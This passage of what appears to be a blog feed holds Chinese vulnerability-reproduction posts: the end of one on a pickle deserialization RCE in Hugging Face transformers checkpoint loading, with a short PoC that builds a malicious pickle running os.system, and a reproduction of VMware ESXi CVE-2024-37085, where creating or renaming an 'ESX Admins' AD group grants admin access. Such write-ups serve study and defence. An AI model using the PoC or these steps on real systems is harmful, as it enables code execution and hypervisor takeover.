-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;model.compile(optimizer=Adam(learning_rate=5e-5), loss=&amp;#x27;sparse_categorical_crossentropy&amp;#x27;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;metrics=[&amp;#x27;accuracy&amp;#x27;])&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;紧接着对传⼊的⽂件夹的合法性进⾏检查，⽐如必须是⼀个⽬录⽂件，必须存在 checkpoint/weights.h5 和 checkpoint/extra_data.pickle 这两个⽂件：&lt;/p&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;        if os.path.isdir(repo_path_or_name):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            local_dir = repo_path_or_name&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        else:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            # If this isn&amp;#x27;t a local path, check that the remote repo exists and has a &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;checkpoint in it&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            repo_files = list_repo_files(repo_path_or_name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            for file in (&amp;quot;checkpoint/weights.h5&amp;quot;, &amp;quot;checkpoint/extra_data.pickle&amp;quot;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                if file not in repo_files:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    raise FileNotFoundError(f&amp;quot;Repo &amp;#123;repo_path_or_name&amp;#125; does not contain &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;checkpoint file &amp;#123;file&amp;#125;!&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            repo = Repository(repo_path_or_name.split(&amp;quot;/&amp;quot;)[-1], &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;clone_from=repo_path_or_name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            local_dir = repo.local_dir&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        # Now make sure the repo actually has a checkpoint in it.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        checkpoint_dir = os.path.join(local_dir, &amp;quot;checkpoint&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        weights_file = os.path.join(checkpoint_dir, &amp;quot;weights.h5&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if not os.path.isfile(weights_file):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            raise FileNotFoundError(f&amp;quot;Could not find checkpoint file weights.h5 in repo &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;repo_path_or_name&amp;#125;!&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        extra_data_file = os.path.join(checkpoint_dir, &amp;quot;extra_data.pickle&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        if not os.path.isfile(extra_data_file):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            raise FileNotFoundError(f&amp;quot;Could not find checkpoint file extra_data.pickle in &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;repo &amp;#123;repo_path_or_name&amp;#125;!&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;再然后，开始读取： extra_data.pickle 反序列化，就来到了我们熟悉的 pickle.load (f) 环节，在这⼀步，产⽣ 了 RCE&lt;/p&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;with open(extra_data_file, &amp;quot;rb&amp;quot;) as f:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; extra_data = pickle.load(f)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; self.optimizer.set_weights(extra_data[&amp;quot;optimizer_state&amp;quot;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # Finally, return the epoch number from the checkpoint. This isn&amp;#x27;t a property of &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;the model, so we can&amp;#x27;t&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; # set it directly, but the user can pass it to fit().&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; return &amp;#123;&amp;quot;epoch&amp;quot;: extra_data[&amp;quot;epoch&amp;quot;]&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;让我们来看⼀下这个 extra_data.pickle ⽂件是如何⽣成的，这⾥定义了⼀个类，然后为这个类创建了⼀个对象 并 dump 到了硬盘上，在这个类上有⼀个特殊的 &lt;strong&gt;reduce&lt;/strong&gt; ⽅法，在 pickle 的规范约定中，反序列化时会调⽤类上 的__reduce__⽅法，所以就 RCE：&lt;/p&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;def generate_extra_data_pickle(filepath, command):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;⽣成extra_data.pickle⽂件，这个⽂件被加载的时候会执⾏给定的命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  :param filepath: extra_data.pickle⽂件的位置&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  :param command: 要执⾏的命令&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  :return:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; class CommandExecute:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; def __reduce__(self):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;在 pickle.load(f) 的时候，此处的命令会被执⾏&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  :return:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; return os.system, (command,)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; poc = CommandExecute()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; with open(filepath, &amp;#x27;wb&amp;#x27;) as fp:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; pickle.dump(poc, fp)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;p&gt;官⽅的修复似乎是把这个⽅法删除掉了？草没看明⽩…&lt;/p&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;https://github.com/huggingface/transformers/commit/693667b8ac8138b83f8adb6522ddaf42fa07c125&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-</content>
-        <category term="漏洞复现" />
-        <updated>2024-10-28T02:24:04.261Z</updated>
-    </entry>
-    <entry>
-        <id>http://example.com/2024/10/28/VMware%20ESXi%20CVE-2024-37085/</id>
-        <title>VMware ESXi CVE-2024-37085漏洞验证分析</title>
-        <link rel="alternate" href="http://example.com/2024/10/28/VMware%20ESXi%20CVE-2024-37085/"/>
-        <content type="html">&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/b906bb43fbf2b211b9e52d27c78065380dd78e4b.jpg&#34; alt=&#34;device&#34;&gt;&lt;/p&gt;
-&lt;h1 id=&#34;漏洞描述&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞描述&#34;&gt;#&lt;/a&gt; 漏洞描述&lt;/h1&gt;
-&lt;p&gt;🍘近日，微软披露了一个 ESXi 漏洞（编号为 CVE-2024-37085）的在野攻击报告 [1]。该漏洞是 VMware ESXi 的一个认证绕过漏洞，已被多个勒索软件所利用。通过该漏洞，攻击者可获取加入 AD 域的 ESXi 的完全操作权限，控制该 ESXi 中包含的虚拟机等。&lt;br&gt;
-漏洞的 NVD 描述为 [2]：VMware ESXi contains an authentication bypass vulnerability. A malicious actor with sufficient Active Directory (AD) permissions can gain full access to an ESXi host that was previously configured to use AD for user management by re-creating the configured AD group (‘ESXi Admins’ by default) after it was deleted from AD。&lt;/p&gt;
-&lt;h2 id=&#34;漏洞影响版本&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞影响版本&#34;&gt;#&lt;/a&gt; 漏洞影响版本&lt;/h2&gt;
-&lt;p&gt;官方发布的 ESXi 影响版本：&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;&lt;strong&gt;VMware Product&lt;/strong&gt;&lt;/th&gt;
-&lt;th&gt;&lt;strong&gt;Version&lt;/strong&gt;&lt;/th&gt;
-&lt;th&gt;&lt;strong&gt;Running On&lt;/strong&gt;&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;ESXi&lt;/td&gt;
-&lt;td&gt;8.0&lt;/td&gt;
-&lt;td&gt;Any&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;ESXi&lt;/td&gt;
-&lt;td&gt;7.0&lt;/td&gt;
-&lt;td&gt;Any&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;p&gt;经过启明星辰 ADLab 的测试和验证，发现低版本的 ESXi 同样受影响。实测的 ESXi 影响版本&lt;br&gt;
-：&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;&lt;strong&gt;VMware Product&lt;/strong&gt;&lt;/th&gt;
-&lt;th&gt;&lt;strong&gt;漏洞存在性&lt;/strong&gt;&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;ESXi 8.0&lt;/td&gt;
-&lt;td&gt;存在&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;ESXi 7.0&lt;/td&gt;
-&lt;td&gt;存在&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;ESXi 6.7&lt;/td&gt;
-&lt;td&gt;存在&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;ESXi 5.5&lt;/td&gt;
-&lt;td&gt;存在&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;h2 id=&#34;漏洞机制&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞机制&#34;&gt;#&lt;/a&gt; 漏洞机制&lt;/h2&gt;
-&lt;p&gt;根据官方文档的描述 [3]，为了方便管理大量 ESXi 主机，VMware ESXi 支持通过 Active Directory (AD) 来管理账号权限。其中，对于加入 AD 域的 ESXi 主机，默认设置了 AD 域 ESX Admins 用户组具有 ESXi 主机的管理员权限。因此，攻击者如果在 AD 域中能创建 ESX Admins 组或更改现有组为 ESX Admin，就能具备对加入该域的 ESXi 主机的完全控制。&lt;/p&gt;
-&lt;p&gt;微软研究人员披露了此漏洞的三种利用方式：&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;创建并添加用户：创建 “ESX Admins” 组，添加用户，进而获得完全管理权限。&lt;/li&gt;
-&lt;li&gt;重命名组并添加用户：重命名现有组为 “ESX Admins”，添加用户或使用现有成员，进而获得完全管理权限。&lt;/li&gt;
-&lt;li&gt;权限刷新：在网络管理员把权限转移给 AD 域的其它组后，ESX Admins 组的管理权限不会立即消失，仍可被利用。&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;ADLab 研究员对三种利用方法进行了复现验证。&lt;/p&gt;
-&lt;h2 id=&#34;漏洞验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞验证&#34;&gt;#&lt;/a&gt; 漏洞验证&lt;/h2&gt;
-&lt;p&gt;本节的漏洞验证以 ESXi6.7 为例，域控在 Server2012 服务器中，ESXi6.7 加入了该域控。&lt;/p&gt;
-&lt;h3 id=&#34;1-方法一验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-方法一验证&#34;&gt;#&lt;/a&gt; 1、方法一验证&lt;/h3&gt;
-&lt;p&gt;（1）在 ESXi 6.7 加入域控后，域控默认是没有 ESX Admins 组的，如下图所示。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/640&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
-&lt;p&gt;（2）使用 test 账户登录 ESXi（该账号目前还不在”ESX Admins” 组内）。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/74e1d492e1f11f22b24e01a1942d5072.png&#34; alt=&#34;74e1d492e1f11f22b24e01a1942d5072&#34;&gt;&lt;/p&gt;
-&lt;p&gt;​	登录失败，提示操作权限被拒绝：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/b53cf5e0d9c153071145574bc7e0a4cf.png&#34; alt=&#34;b53cf5e0d9c153071145574bc7e0a4cf&#34;&gt;&lt;/p&gt;
-&lt;p&gt;（3）使用 net group 命令，创建 1 个名为 ESX Admins 的用户组。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/8e963ed7a5d06ed6d752b7fa5ec1c36d.png&#34; alt=&#34;8e963ed7a5d06ed6d752b7fa5ec1c36d&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/d6de7d02d189544278ac5b30765d8f90.png&#34; alt=&#34;d6de7d02d189544278ac5b30765d8f90&#34;&gt;&lt;/p&gt;
-&lt;p&gt;使用 net group 命令，将 test 用户加入 ESX Admins 组：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/3a9d66d3de98c60c53a3a1c9ea2c3414.png&#34; alt=&#34;3a9d66d3de98c60c53a3a1c9ea2c3414&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/1be60ace68d4c52cd161bb28904221ee.png&#34; alt=&#34;1be60ace68d4c52cd161bb28904221ee&#34;&gt;&lt;/p&gt;
-&lt;p&gt;​	使用 test 用户登录，能够登录成功且能执行高权限操作：&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/c7f271856e079e8166227ae7a34eafb2.png&#34; alt=&#34;c7f271856e079e8166227ae7a34eafb2&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/4dbba38acd842e1585ab18e6e67d93d0.png&#34; alt=&#34;4dbba38acd842e1585ab18e6e67d93d0&#34;&gt;&lt;/p&gt;
-&lt;p&gt;经测试，该方法在其它 ESXi 版本上也能成功，具体测试版本有：&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;&lt;strong&gt;VMware Product&lt;/strong&gt;&lt;/th&gt;
-&lt;th&gt;&lt;strong&gt;方法可利用&lt;/strong&gt;&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;ESXi 8.0&lt;/td&gt;
-&lt;td&gt;是&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;ESXi 7.0&lt;/td&gt;
-&lt;td&gt;是&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;ESXi 6.7&lt;/td&gt;
-&lt;td&gt;是&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;ESXi 5.5&lt;/td&gt;
-&lt;td&gt;是&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;h3 id=&#34;2-方法二验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-方法二验证&#34;&gt;#&lt;/a&gt; 2、 方法二验证&lt;/h3&gt;
-&lt;p&gt;（1）在 ESXi 6.7 加入域控后，域控默认是没有 ESX Admins 组。&lt;/p&gt;
-&lt;p&gt;（2）首先，创建 1 个名为 g1 的组，把 test 用户加到 g1 组，使用 test 登录 ESXi。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/20865897feabc077a1e9ed22ccdecccc.png&#34; alt=&#34;20865897feabc077a1e9ed22ccdecccc&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/51508ba363caa31cd39907a636ddecf1.png&#34; alt=&#34;51508ba363caa31cd39907a636ddecf1&#34;&gt;&lt;/p&gt;
-&lt;p&gt;​	登录失败，提示操作权限被拒绝。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/413fa97a2f7212102613dcac055ff286.png&#34; alt=&#34;413fa97a2f7212102613dcac055ff286&#34;&gt;&lt;/p&gt;
-&lt;p&gt;（3）然后，修改 g1 的名称为 ESX Admins。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/75eb50838691c37a155c6f06ba664fb4.png&#34; alt=&#34;75eb50838691c37a155c6f06ba664fb4&#34;&gt;&lt;/p&gt;
-&lt;p&gt;（4）最后，利用 test 用户登录 ESXi。&lt;/p&gt;
-&lt;p&gt;​	登录成功，查看权限为管理员&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/be274dd5a1ae02cd12c72c33565fa1b7.png&#34; alt=&#34;be274dd5a1ae02cd12c72c33565fa1b7&#34;&gt;&lt;/p&gt;
-&lt;p&gt;​	经测试，该方法在其它 ESXi 版本上也能成功，具体测试版本有：&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;&lt;strong&gt;VMware Product&lt;/strong&gt;&lt;/th&gt;
-&lt;th&gt;&lt;strong&gt;方法可利用&lt;/strong&gt;&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;ESXi 8.0&lt;/td&gt;
-&lt;td&gt;是&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;ESXi 7.0&lt;/td&gt;
-&lt;td&gt;是&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;ESXi 6.7&lt;/td&gt;
-&lt;td&gt;是&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;ESXi 5.5&lt;/td&gt;
-&lt;td&gt;是&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
-&lt;h3 id=&#34;3-方法三验证&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-方法三验证&#34;&gt;#&lt;/a&gt; 3、方法三验证&lt;/h3&gt;
-&lt;p&gt;（1）在 ESXi 6.7 加入域控后，创建 ESX Admins 组和 g1 组，test 和 test2 分别加入 2 个组。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/e5da5caf050ecbf1ea65b559e8b33a1a.png&#34; alt=&#34;e5da5caf050ecbf1ea65b559e8b33a1a&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/56be2c204852bc6f54137d4750d686a8.png&#34; alt=&#34;56be2c204852bc6f54137d4750d686a8&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/da9a9506cc31bb6ca884b9a3966d3fdf.png&#34; alt=&#34;da9a9506cc31bb6ca884b9a3966d3fdf&#34;&gt;&lt;/p&gt;
-&lt;p&gt;（2）登录 ESXi 尝试&lt;/p&gt;
-&lt;p&gt;​	用户 test 属于 ESX Admins 组，能够成功登录&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/4b0a5ecb77d69e60a05f63ca91aaf48b.png&#34; alt=&#34;4b0a5ecb77d69e60a05f63ca91aaf48b&#34;&gt;&lt;/p&gt;
-&lt;p&gt;​	用户 test2 属于 g1 组，登录失败，提示操作权限被拒绝。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/4b89328cc8c789285d80a67738a4fc20.png&#34; alt=&#34;4b89328cc8c789285d80a67738a4fc20&#34;&gt;&lt;/p&gt;
-&lt;p&gt;（3）修改 ESXi 的配置，修改默认的域管理员组为 g1。&lt;/p&gt;
-&lt;p&gt;​	用户 test2 登录，能够登录成功。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/87fbcd5169a8c4aed65a9613fd800071.png&#34; alt=&#34;87fbcd5169a8c4aed65a9613fd800071&#34;&gt;&lt;/p&gt;
-&lt;p&gt;​	用户 test 登录，仍然能登录成功。尽管，此时 test 用户实际已经不属于 ESXi 配置的域管理员组。&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;https://lilitu-1328433275.cos.ap-beijing.myqcloud.com/test/10aad9f69bd9393fbc146781346b19f1.png&#34; alt=&#34;10aad9f69bd9393fbc146781346b19f1&#34;&gt;&lt;/p&gt;
-&lt;p&gt;​	经测试，该方法在其它 ESXi 版本上也能成功，具体测试版本有：&lt;/p&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;&lt;strong&gt;VMware Product&lt;/strong&gt;&lt;/th&gt;
-&lt;th&gt;&lt;strong&gt;方法可利用&lt;/strong&gt;&lt;/th&gt;
-&lt;/tr&gt;
-&lt;/thead&gt;
-&lt;tbody&gt;
-&lt;tr&gt;
-&lt;td&gt;ESXi 8.0&lt;/td&gt;
-&lt;td&gt;是&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;ESXi 7.0&lt;/td&gt;
-&lt;td&gt;是&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;ESXi 6.7&lt;/td&gt;
-&lt;td&gt;是&lt;/td&gt;
-&lt;/tr&gt;
-&lt;tr&gt;
-&lt;td&gt;ESXi 5.5&lt;/td&gt;
-&lt;td&gt;是&lt;/td&gt;
-&lt;/tr&gt;
-&lt;/tbody&gt;
-&lt;/table&gt;
